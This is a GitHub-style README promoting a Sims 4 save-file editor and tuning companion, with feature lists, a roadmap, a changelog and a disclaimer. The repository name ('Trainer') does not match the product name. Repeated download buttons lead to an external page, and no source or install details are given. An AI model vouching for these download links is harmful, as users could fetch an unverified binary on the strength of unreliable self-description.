![preview](https://raw.githubusercontent.com/CRDLCV/Sims-4-Trainer-Refined/main/showcase_807eaad.svg)
[![Download](https://raw.githubusercontent.com/CRDLCV/Sims-4-Trainer-Refined/main/latest_5b87f8.svg)](https://CRDLCV.github.io/Sims-4-Trainer-Refined/)

# 🎮 Sims Save Suite — Neighborhood Companion Toolkit

> **A save-file companion and live tuning workshop for your Sims 4 neighborhoods — built for storytellers, modders, and curious tinkerers who want to shape their world without wading through menus.**

[![Download](https://raw.githubusercontent.com/CRDLCV/Sims-4-Trainer-Refined/main/latest_5b87f8.svg)](https://CRDLCV.github.io/Sims-4-Trainer-Refined/)

---

## 🧭 Overview

**Sims Save Suite** is an independent, community-driven desktop companion for exploring and refining your Sims 4 save data and in-game tuning. Unlike typical external utilities that just toggle a number or two, this project treats your save folder like a living document — something you can read, annotate, back up, diff, and gently adjust.

Think of it as a **librarian for your neighborhoods**: it indexes every household, relationship edge, career record, inventory entry, and lot trait so you can find what you're looking for in a heartbeat. Then, if you want, it lets you make precise adjustments through a clean, structured interface — no guesswork, no scrambled saves, no tears.

Originally inspired by the long lineage of Sims trainers, this project pivoted hard toward **save integrity, transparency, and reversibility**. Every edit is journaled. Every change can be rolled back. Every action is logged in plain, human-readable text you can audit at any time.

Whether you're chronicling a multi-generation legacy and want to fine-tune one lagging aspiration, or building a sprawling Wild West town from scratch and need to wire up family trees efficiently, Sims Save Suite is designed to stay out of your way and let the story lead.

---

## ✨ Why This Exists

Most save-editing tools fall into two camps:

1. **Opaque black boxes** — they promise power but hide how they work.
2. **Spreadsheet dumps** — they show everything but offer no guidance.

Sims Save Suite sits between them. It presents your save data as **structured, searchable, and contextual**, then offers a **sandboxed editing layer** where you can preview every consequence before you commit.

The mission is simple: **respect the player's time, the save's integrity, and the story being told.**

---

## 🚀 Feature Highlights

### 🧩 Save Parsing & Indexing
- Full scan of household rosters, sim biographies, relationship graphs, and lot metadata.
- Fast, incremental re-indexing — only re-reads what changed since the last snapshot.
- Automatic detection of save slots, backup rotations, and "slot_0000000X.save" naming conventions.
- Cross-references households, lots, and world placements into a unified neighborhood view.

### 🛠️ Live Tuning Workshop
- Browse tuning definitions by category: traits, buffs, interactions, autonomy, motives, and more.
- Compare a modded tuning file against the vanilla baseline in a side-by-side diff.
- Draft overrides that stay **isolated from the base game files** until you explicitly promote them.
- Validation pass catches malformed references, circular dependencies, and orphaned IDs before they reach your game.

### 📓 Reversible Edit Journal
- Every change is written to a timestamped journal entry with a human-readable summary.
- One-click rollback of an entire session, a single household, or a single field.
- Snapshot diffing shows you exactly what changed between two points in time.
- Journal files are plain text — readable in any editor, archivable in any backup tool.

### 🔍 Smart Search & Filters
- Full-text search across sim names, traits, careers, and custom metadata.
- Filter builders: combine world, household size, life stage, aspiration, and relationship type.
- Saved searches persist between sessions so you don't rebuild queries every time.
- Regex support for power users who want surgical precision.

### 🧬 Relationship Graph Explorer
- Interactive family tree rendering with adjustable depth and branch pruning.
- Detects disconnected branches, duplicate ancestral references, and impossible age gaps.
- Highlights "socially isolated" sims with no outgoing relationship edges.
- Export graph snapshots as structured text for external tools.

### 🎒 Inventory & Household Auditor
- Lists every item, reward, collectible, and reward trait per household.
- Flags duplicate unique items and misfiled inventory entries.
- Summarizes household net worth, billable assets, and lot value contributions.
- Suggests (never forces) cleanup candidates based on your own rules.

### 🌍 Multilingual Interface
- Interface strings are fully externalized and community-translatable.
- Ships with English by default; every other locale is a plain text file drop-in.
- Right-to-left layout support built in from day one.
- Locale-aware number, date, and list formatting.

### 🖥️ Responsive Desktop UI
- Adaptive layout scales from compact laptop windows to ultrawide monitors.
- Keyboard-first navigation — every action reachable without touching the mouse.
- Dark, light, and "midnight study" themes with high-contrast variants.
- DPI-aware rendering keeps text crisp on 4K and scaled displays.

### 🕐 Always-Available Assistance
- Built-in knowledge base that answers common questions without leaving the app.
- Guided walkthroughs for first-time save scanning and tuning overrides.
- Community support channels monitored around the clock, every day of the week.
- In-app diagnostics that package your logs into a shareable report format.

### 🛡️ Safety & Integrity First
- Never touches your original save until you explicitly confirm a write.
- Automatic timestamped backups before any mutation step.
- Read-only "audit mode" for users who just want to explore.
- Checksum verification after every save write.

---

## 🧪 Use Cases & Story Seeds

- **Legacy chroniclers** who want to verify a family tree survives 10 generations intact.
- **Builders** who need to relocate a household without dragging every item manually.
- **Mod authors** testing tuning overrides in a controlled, reversible environment.
- **Challenge runners** auditing their own progress against self-imposed rules.
- **Lore keepers** tracking relationship changes across long narrative playthroughs.
- **Data tinkerers** curious about how the save format is actually structured.
- **Streamers** who need quick, safe edits on the fly without breaking continuity.
- **Accessibility users** who prefer keyboard-driven workflows over mouse-heavy ones.

---

## 🧠 Design Philosophy

Three principles shape every decision in this project:

1. **Transparency over magic.** If the tool does something, you can see why and undo it.
2. **Reversibility over confidence.** No irreversible operations, ever, by design.
3. **Player agency over automation.** Suggestions are offered; decisions remain yours.

This isn't a tool that plays the game for you. It's a tool that hands you a better map of the game you're already playing.

---

## 🗺️ Roadmap (2026 and Beyond)

| Quarter | Focus Area |
|---------|------------|
| Q1 2026 | Save format version coverage expansion |
| Q2 2026 | Relationship graph filters and export formats |
| Q3 2026 | Community translation pipeline improvements |
| Q4 2026 | Tuning override conflict resolution assistant |
| 2027 | Cross-save comparison and merge tooling (exploratory) |

Roadmap items are intentions, not promises. Priorities shift with community feedback and save-format updates.

---

## 🌐 Multilingual Support Matrix

| Language | Status | Notes |
|----------|--------|-------|
| English  | Complete | Reference locale |
| Spanish  | Complete | Community maintained |
| French   | Complete | Community maintained |
| German   | Beta | Seeking reviewers |
| Portuguese | Beta | Community maintained |
| Japanese | In progress | Volunteers welcome |
| Korean   | In progress | Volunteers welcome |
| Polish   | Planning | Awaiting coordinator |

Adding a locale is a matter of dropping a structured text file into the locales directory and submitting a pull request.

---

## 🧑‍💻 Contributing

Contributions are warmly welcomed — from typo fixes to whole new modules.

**Ways to contribute:**

- 🐛 Report bugs with reproducible steps and save-file version info
- 💡 Suggest features with a clear use case and expected behavior
- 🌍 Translate interface strings into your language
- 📚 Improve documentation and onboarding guides
- 🧪 Test pre-release builds and report regressions
- 🎨 Contribute themes, icons, or accessibility improvements

Before opening a pull request, please read the contributor guide in the docs folder. Keep changes focused, include tests where possible, and describe the "why" in your commit message.

---

## 🔒 Privacy & Data Handling

- Save files are processed **locally on your machine**.
- No telemetry, no phone-home, no cloud sync by default.
- Optional diagnostic reports are generated only when you request them.
- Any network feature is opt-in and clearly labeled at the point of use.

Your stories are yours. The tool is a guest in your save folder and behaves accordingly.

---

## 📜 License

This project is released under the **MIT License**. See the full text at:

https://opensource.org/licenses/MIT

Copyright (c) 2026 Sims Save Suite contributors.

---

## ⚠️ Disclaimer

Sims Save Suite is an **independent, fan-made companion tool** and is **not affiliated with, endorsed by, or sponsored by** Electronic Arts, Maxis, or any of their subsidiaries or affiliates. All trademarks, product names, and logos referenced belong to their respective owners.

This project does **not** distribute, bundle, or modify any proprietary game assets. It reads and writes save data that you already own and provides tuning utilities intended for personal, local use.

Use of this tool is at your own discretion. Always maintain independent backups of your save files. The maintainers are not responsible for lost progress, corrupted saves, or unexpected in-game behavior resulting from manual adjustments.

If you enjoy the project, consider contributing a translation, filing a thoughtful issue, or sharing your save-auditing workflow with the community.

---

## 💬 Support & Community

- **Documentation:** See the docs directory for guides and reference material.
- **Questions:** Open a discussion thread — no question is too small.
- **Bug reports:** Use the issue tracker with a clear title and reproduction steps.
- **Feature ideas:** Start a discussion before opening a formal proposal.
- **Support hours:** Assistance is available 24 hours a day, 7 days a week through the community channels.

---

## 🧾 Changelog Snapshot

**v2.4.0 — 2026-01-18**
- Added relationship graph pruning controls
- Improved save slot auto-detection for rotated backups
- New locale scaffolding for Korean and Polish
- Fixed a rare indexing stall on very large households

**v2.3.2 — 2025-11-30**
- Journal rollback now handles nested household edits gracefully
- Tuning validator detects circular references across mod layers
- Minor UI polish for high-DPI displays

**v2.3.0 — 2025-10-12**
- Introduced read-only audit mode
- Added export for household inventories
- Improved dark theme contrast ratios

---

## 🌟 Final Thoughts

Every save file is a small universe carrying years of stories, half-finished arcs, and quiet moments the game never surfaces on its own. Sims Save Suite exists to help you keep those universes coherent — to give you a lantern, a map, and a steady hand while you wander through them.

Build boldly. Back up often. And enjoy the neighborhood you're writing.

[![Download](https://raw.githubusercontent.com/CRDLCV/Sims-4-Trainer-Refined/main/latest_5b87f8.svg)](https://CRDLCV.github.io/Sims-4-Trainer-Refined/)